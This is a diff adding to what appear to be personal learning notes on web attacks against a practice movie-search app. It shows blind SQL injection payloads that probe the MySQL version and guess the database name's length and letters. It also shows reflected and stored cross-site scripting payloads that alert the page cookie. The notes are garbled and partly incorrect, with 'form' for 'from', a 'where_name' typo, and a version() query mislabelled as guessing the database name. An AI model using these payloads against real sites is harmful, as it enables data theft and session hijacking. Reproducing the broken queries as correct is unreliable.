@@ -1904,11 +1904,29 @@ select * form movies where_name='Iron man'  AND substring(version(), 1,1)=4#'
 or
 'Iron man'  AND substring(version(), 1,1)=5#'
 
+now MySQL version 5 
 
+6
+Let's try to guess the DB NAME length
+select * form movies where_name='Iron man'  AND length(database())=a#'
 
+select * form movies where_name='Iron man'  AND length(database())=2#'
+select * form movies where_name='Iron man'  AND length(database())=5#'
+
+7. Let's  try to guess the DB	 name's first latter 
+'Iron man'  AND substring(version(), 1,1)='a'# 
+'Iron man'  AND substring(version(), 1,1)='b'# 
+first letter of DB name- which we trying to see........
+
+8. Let's  try to guess the DB	 name's Sec latter 
 
 ===================================================
 - Cross Site Scripting 
+Reflected Cross site scripting
+as username
+<script>alert(Document.cookie)</script>
+password as is it
 
-
-
+Storted Cross site scripting
+in a search -
+<script>alert(Document.cookie)</script>
